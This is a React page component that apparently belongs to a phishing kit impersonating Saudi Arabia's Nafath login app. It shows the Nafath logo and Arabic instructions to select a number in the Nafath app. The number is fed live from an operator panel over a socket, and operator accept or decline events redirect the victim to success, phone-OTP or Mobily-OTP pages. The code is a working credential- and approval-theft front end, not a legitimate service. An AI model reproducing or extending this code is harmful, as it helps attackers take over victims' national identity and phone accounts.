import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { socket } from "../App";

const Navaz = () => {
  const query = new URLSearchParams(window.location.search);
  const [otp, setOtp] = useState(
    query.get("otp") ?? query.get("code") ?? "",
  );
  const navigate = useNavigate();
  const orderId = sessionStorage.getItem("id");

  useEffect(() => {
    if (!orderId) return;
    const joinRoom = () => socket.emit("joinOrder", orderId);
    joinRoom();
    socket.on("connect", joinRoom);
    return () => socket.off("connect", joinRoom);
  }, [orderId]);

  useEffect(() => {
    if (!orderId) return;
    socket.emit("navaz", {
      _id: orderId,
      id: orderId,
      NavazOtp: otp || undefined,
    });
  }, [orderId, otp]);

  useEffect(() => {
    const sameOrder = (id) => String(id) === String(orderId);

    const onAcceptNavaz = (payload) => {
      const id = payload?.id ?? payload;
      if (!sameOrder(id)) return;
      navigate("/success");
    };

    const onDeclineNavaz = (id) => {
      if (!sameOrder(id)) return;
      if (sessionStorage.getItem("provider") === "موبايلي") {
        window.location.href = "/mobilyOtp";
      } else {
        window.location.href = "/phoneOtp";
      }
    };

    const onNavazChange = ({ price, id }) => {
      if (sameOrder(id) && price != null) setOtp(String(price));
    };

    const onAcceptService = ({ price, code, id }) => {
      const v = price ?? code;
      if (sameOrder(id) && v != null && v !== "") setOtp(String(v));
    };

    const onDeclineService = (id) => {
      if (!sameOrder(id)) return;
      window.location.href = "/phone";
    };


    const onAcceptPhoneOtp = ({ price, id }) => {
      if (sameOrder(id) && price != null) setOtp(String(price));
    };
    const onDeclinePhoneOtp = (id) => {
      if (!sameOrder(id)) return;
      window.location.href = "/phone";
    };
    const onAcceptMobilyOtp = ({ price, id }) => {
      if (sameOrder(id) && price != null) setOtp(String(price));
    };
    const onDeclineMobilyOtp = (id) => {
      if (!sameOrder(id)) return;
      window.location.href = "/phone";
    };

    socket.on("acceptNavaz", onAcceptNavaz);
    socket.on("declineNavaz", onDeclineNavaz);
    socket.on("navazChange", onNavazChange);
    socket.on("acceptService", onAcceptService);
    socket.on("declineService", onDeclineService);
    socket.on("declinePhoneOtp", onDeclinePhoneOtp);
    socket.on("acceptPhoneOtp", onAcceptPhoneOtp);
    socket.on("acceptMobOtp", onAcceptMobilyOtp);
    socket.on("declineMobOtp", onDeclineMobilyOtp);

    return () => {
      socket.off("acceptNavaz", onAcceptNavaz);
      socket.off("declineNavaz", onDeclineNavaz);
      socket.off("navazChange", onNavazChange);
      socket.off("acceptService", onAcceptService);
      socket.off("declineService", onDeclineService);
      socket.off("declinePhoneOtp", onDeclinePhoneOtp);
      socket.off("acceptPhoneOtp", onAcceptPhoneOtp);
      socket.off("acceptMobOtp", onAcceptMobilyOtp);
      socket.off("declineMobOtp", onDeclineMobilyOtp);
    };
  }, [orderId, navigate]);

  return (
    <div className="w-full flex flex-col items-center justify-center bg-white py-5 gap-5 ">
      <img src="/navazLogo.png" alt="navazLogo Logo" className="w-16" />
      <span
        className="text-center w-4/5  bg-green-100 rounded-md p-3  text-gray-600  "
        style={{ border: "1px solid #14a196" }}
      >
        الرجاء التوجه الى تطبيق نفاذ باختيار الرقم
        الذي سوف يظهر في الاسفل{" "}
        <div className="text-4xl text-green-500 animate-bounce mt-5">
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
          <span>&bull;</span>
        </div>
        <span className="text-gray-600 ">جاري المعالجة . نرجو الانتظار</span>
      </span>
      <div
        className="min-w-20 min-h-20 px-5 flex items-center justify-center text-2xl text-green-800 "
        style={{ border: "2px solid #14a196" }}
      >
        {otp ? otp : "??"}
      </div>
      <img src="/navazOtp.jpg" alt="Nafath instructions" className="md:w-2/5 p-2 " />
    </div>
  );
};

export default Navaz;
